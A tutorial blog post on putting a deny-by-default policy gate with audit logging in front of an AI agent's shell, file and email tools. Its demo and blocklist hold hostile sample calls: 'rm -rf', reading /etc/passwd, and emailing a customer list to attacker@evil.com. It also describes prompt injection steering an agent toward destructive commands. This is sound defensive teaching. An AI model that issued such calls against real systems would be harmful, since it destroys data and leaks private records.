---
layout: post
title: "Put a Policy Gate in Front of Your AI Agent's Tools"
date: 2026-09-26 12:00:00 -0500
categories: [Tutorials]
tags: [Tutorials, AI Agents, Security, Policy-as-Code]
description: "A step-by-step walkthrough: intercept every tool call your AI agent makes with a small policy-as-code gate, deny by default, and audit everything."
---

Your agent has a shell tool. That is the whole threat model. A retrieved document tells it to clean up old files, and it reaches for `rm -rf` in the wrong one. The prompt was fine. The tool call is where the damage happened.

Every agent tutorial shows you how to define tools. Almost none show you how to restrain them. Here is the part they skip: a gate between the model's decision and the tool's execution that checks each call against a policy you wrote and writes down the answer. Deny by default. Allow by exception. Log everything.

## Know What You Are Building

In thirty minutes you will build three things in one Python file: a policy written as a plain dictionary, a `check_call(tool, args)` function that returns an allow-or-deny decision with a reason, and an audit log recording every decision as a JSON line. Underneath them sits a toy agent loop with three tools: `read_file`, `run_shell`, and `send_email`. By the end, no tool executes without a policy decision, and you will have watched the gate allow a benign call and refuse a malicious one.

Prerequisites: Python 3.10 or newer and a terminal. No packages to install. Everything here uses the standard library, which is deliberate: the gate should be the easiest part of your agent to read, not another dependency to audit.

## Step 1: Build the Toy Agent First

Start with the dangerous version, so you can see exactly what the gate is protecting. Create `policy_gate.py` with three stub tools and a naive dispatch that runs whatever it is told:

```python
# policy_gate.py, step 1: the toy agent, no gate yet
def tool_read_file(args):
    return "contents of %s (stubbed)" % args["path"]


def tool_run_shell(args):
    return "stub: would run: %s" % args["command"]


def tool_send_email(args):
    return "stub: email to %s with subject '%s'" % (args["to"], args.get("subject", ""))


TOOLS = {
    "read_file": tool_read_file,
    "run_shell": tool_run_shell,
    "send_email": tool_send_email,
}


def dispatch(tool, args):
    return TOOLS[tool](args)


if __name__ == "__main__":
    print(dispatch("read_file", {"path": "/tmp/work/notes.txt"}))
    print(dispatch("run_shell", {"command": "rm -rf /tmp/work"}))
```

Run it with `python3 policy_gate.py`. You will see both calls execute, including the destructive one:

```
contents of /tmp/work/notes.txt (stubbed)
stub: would run: rm -rf /tmp/work
```

Two things matter here. First, the tools are stubs, so nothing was deleted, but in a real agent `tool_run_shell` calls `subprocess`, and that second line is the one that ends careers. Second, dispatch is a dictionary lookup. It never inspects the command, the path, or the recipient. Whatever the model emits runs. That is the entire vulnerability, and it lives in six lines you wrote yourself.

## Step 2: Write the Policy as Data

Now add the policy. Put this dictionary near the top of `policy_gate.py`, above the tools:

```python
# The policy, as data. Read it in one screen; change it without touching logic.
POLICY = {
    "read_file": {
        "allowed_prefixes": ["/tmp/work/"],
    },
    "run_shell": {
        "allowed_commands": ["ls", "cat", "wc", "head", "tail", "grep"],
        "blocked_patterns": [r"\brm\s+-rf\b", r";", r"&&", r"\|\|", r"`", r"\$\("],
        "allowed_prefixes": ["/tmp/work/"],
    },
    "send_email": {
        "allowed_recipients": [r".*@internal\.example\.com$"],
    },
}
```

A few things are worth noting about this example. First, the policy is data, not code: you can read it in one screen, and adding a rule never touches the gate logic. Second, anything not listed here does not exist as far as the gate is concerned: there is no `delete_user` entry, so a call to one is denied. That is deny by default, the single most important property of this file. Third, `run_shell` has two layers: an allowlist of commands plus a blocklist of patterns. Allowlists do the real work; the patterns catch the obvious bypasses, like chaining a second command after a semicolon.

## Step 3: Write the Gate

Add the gate below the policy. It takes a tool name and its arguments, and returns a decision plus a human-readable reason:

```python
# The gate. Returns (allowed, reason). Unknown tools are denied by default.
import re


def _path_ok(path, prefixes):
    if not isinstance(path, str):
        return False
    # The directory itself must match too, not just paths inside it.
    # The rstrip keeps /tmp/workevil from sneaking past a /tmp/work/ prefix.
    return any(path == p.rstrip("/") or path.startswith(p) for p in prefixes)


def check_call(tool, args):
    if tool not in POLICY:
        return False, "unknown tool '%s'" % tool

    if tool == "read_file":
        path = args.get("path", "")
        if _path_ok(path, POLICY["read_file"]["allowed_prefixes"]):
            return True, "path is inside an allowed prefix"
        return False, "path '%s' is outside allowed prefixes" % path

    if tool == "run_shell":
        cmd = args.get("command", "")
        for pattern in POLICY["run_shell"]["blocked_patterns"]:
            if re.search(pattern, cmd):
                return False, "blocked pattern matched: %s" % pattern
        first = cmd.split()[0] if cmd.split() else ""
        if first not in POLICY["run_shell"]["allowed_commands"]:
            return False, "command '%s' is not allowlisted" % first
        for token in cmd.split():
            if token.startswith("/") and not _path_ok(token, POLICY["run_shell"]["allowed_prefixes"]):
                return False, "path '%s' is outside allowed prefixes" % token
        return True, "command allowlisted, args inside /tmp/work/"

    if tool == "send_email":
        to = args.get("to", "")
        for pattern in POLICY["send_email"]["allowed_recipients"]:
            if re.match(pattern, to):
                return True, "recipient domain is allowlisted"
        return False, "recipient '%s' is not allowlisted" % to

    return False, "no rule matched"
```

`check_call("read_file", {"path": "/tmp/work/notes.txt"})` returns `(True, "path is inside an allowed prefix")`. `check_call("delete_user", {"id": "root"})` returns `(False, "unknown tool 'delete_user'")`. Every decision carries a reason, and the reason is not decoration: it is what you will read at 2am when a legitimate call is denied.

Two design choices are worth calling out. The gate never throws: a missing argument or an unknown tool produces a deny with a reason, not an exception, because the dispatch path must always get an answer. And the final `return False, "no rule matched"` is a backstop. If you add a fourth tool to the policy tomorrow and forget to add its branch here, calls to it are denied until you write the rule. Fail closed. One more detail: `_path_ok` treats the directory itself as inside its own prefix, but rejects `/tmp/workevil` against a `/tmp/work/` prefix. Naive `startswith` checks on paths are a classic bypass; this one is written to not be one.

## Step 4: Put the Gate in the Dispatch Path

Now replace the naive `dispatch` from step 1 with the gated version. This is the whole architectural move, and it is three lines:

```python
# The dispatch path. There is exactly one way to reach a tool,
# and it goes through the gate. No tool executes without a policy decision.
def dispatch(tool, args):
    allowed, reason = check_call(tool, args)
    log_decision(tool, args, allowed, reason)
    if not allowed:
        return "DENIED: %s" % reason
    return TOOLS[tool](args)
```

There is exactly one function that calls tools, and it asks the gate first. If you add a fourth tool next week, it inherits the gate for free, because nothing else in the file can reach `TOOLS`. When someone proposes a shortcut that calls a tool directly, that is the code review comment: all tool calls go through `dispatch`.

## Step 5: Log Every Decision

Add the audit log. Every decision, allow or deny, becomes one JSON line:

```python
# The audit log. Every decision, allow or deny, lands here as one JSON line.
import json
from datetime import datetime, timezone


AUDIT_LOG = []


def log_decision(tool, args, allowed, reason):
    AUDIT_LOG.append({
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "tool": tool,
        "args": args,
        "decision": "allow" if allowed else "deny",
        "reason": reason,
    })


def flush_audit(path="audit.log"):
    with open(path, "w") as f:
        for entry in AUDIT_LOG:
            f.write(json.dumps(entry) + "\n")
```

This is the artifact your incident review will read. Note that the log records the decision and the reason, not just the outcome. "Denied" tells you nothing six weeks later; "denied, recipient not allowlisted" tells you the policy worked. Timestamps are UTC and ISO formatted. Local timezones in audit logs are how you lose an afternoon to an off-by-five-hours mystery.

## Step 6: Run It and Watch It Say No

Replace the demo block at the bottom of the file with this:

```python
# The demo. Three benign calls, then four calls that should never run.
def _summarize(args):
    return " ".join("%s=%s" % (k, v) for k, v in args.items())


def demo():
    calls = [
        ("read_file", {"path": "/tmp/work/notes.txt"}),
        ("run_shell", {"command": "ls /tmp/work"}),
        ("send_email", {"to": "teammate@internal.example.com",
                        "subject": "deploy notes", "body": "all green"}),
        ("run_shell", {"command": "rm -rf /tmp/work"}),
        ("read_file", {"path": "/etc/passwd"}),
        ("send_email", {"to": "attacker@evil.com",
                        "subject": "exfil", "body": "customer list"}),
        ("delete_user", {"id": "root"}),
    ]
    for tool, args in calls:
        allowed, reason = check_call(tool, args)
        print("[%s] %s(%s): %s" % ("ALLOW" if allowed else "DENY", tool,
                                   _summarize(args), reason))
        print("  ->", dispatch(tool, args))
    flush_audit()
    print("wrote %d decisions to audit.log" % len(AUDIT_LOG))


if __name__ == "__main__":
    demo()
```

## Prove It Works

Run the file and check the output line by line:

```
python3 policy_gate.py
```

You should see exactly this:

```
[ALLOW] read_file(path=/tmp/work/notes.txt): path is inside an allowed prefix
  -> contents of /tmp/work/notes.txt (stubbed)
[ALLOW] run_shell(command=ls /tmp/work): command allowlisted, args inside /tmp/work/
  -> stub: would run: ls /tmp/work
[ALLOW] send_email(to=teammate@internal.example.com subject=deploy notes body=all green): recipient domain is allowlisted
  -> stub: email to teammate@internal.example.com with subject 'deploy notes'
[DENY] run_shell(command=rm -rf /tmp/work): blocked pattern matched: \brm\s+-rf\b
  -> DENIED: blocked pattern matched: \brm\s+-rf\b
[DENY] read_file(path=/etc/passwd): path '/etc/passwd' is outside allowed prefixes
  -> DENIED: path '/etc/passwd' is outside allowed prefixes
[DENY] send_email(to=attacker@evil.com subject=exfil body=customer list): recipient 'attacker@evil.com' is not allowlisted
  -> DENIED: recipient 'attacker@evil.com' is not allowlisted
[DENY] delete_user(id=root): unknown tool 'delete_user'
  -> DENIED: unknown tool 'delete_user'
wrote 7 decisions to audit.log
```

Three allows, four denies, each with a reason. Confirm the audit log captured all seven:

```
cat audit.log
```

Open `audit.log` and check that all seven decisions landed there as JSON lines, each with a timestamp, tool, args, decision, and reason.

If any line differs from the expected output, stop and diff your file against the steps before continuing. A gate whose behavior surprises you in a tutorial will surprise you worse in production.

## Know Where This Breaks

Know its limits before you trust it.

- A policy cannot catch prompt injection smuggled inside otherwise-allowed arguments. `send_email` to an allowlisted teammate with an attacker-crafted body sails straight through. The gate checks the envelope, not the letter.
- The regex blocklist is crude. A clever command can dodge `\brm\s+-rf\b`, which is why the command allowlist does the real work and the patterns are only a second layer. If you find yourself writing ever-longer regexes, stop: you need an argument parser, not a longer blocklist.
- High-stakes tools want more than allow or deny: a third decision, "needs human approval," for anything irreversible. This tutorial does not build it.
- Keep the policy small enough to audit by eye. Past about fifty lines, graduate to a real policy language. A policy nobody reads is a policy nobody trusts.

## Take It Further

For a real deployment, replace the Python dictionary with [Rego policies evaluated by Open Policy Agent](https://www.openpolicyagent.org/docs/), which gives you versioned, testable policy bundles. If you prefer a purpose-built language, [Cedar](https://www.cedarpolicy.com/) was designed for exactly this shape of problem: who can do what, under which conditions. Either way, keep the architecture from step 4: one dispatch path, one gate, every decision logged.

The most useful upgrade to this file is not a smarter rule, it is an approval queue: allow, deny, or hold for a human. The dangerous moment in every agent project is not the first tool. It is the tenth tool, added in a hurry, wired straight to dispatch. Put the gate in before that day arrives.

What is the scariest tool you have given an agent so far?

## Keep Reading

1. [Open Policy Agent documentation](https://www.openpolicyagent.org/docs/): Rego, policy bundles, and testing for production policy-as-code.
2. [Cedar policy language](https://www.cedarpolicy.com/): a purpose-built language for authorization decisions like the ones in this tutorial.
3. [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework): the governance context this kind of gate lives inside.
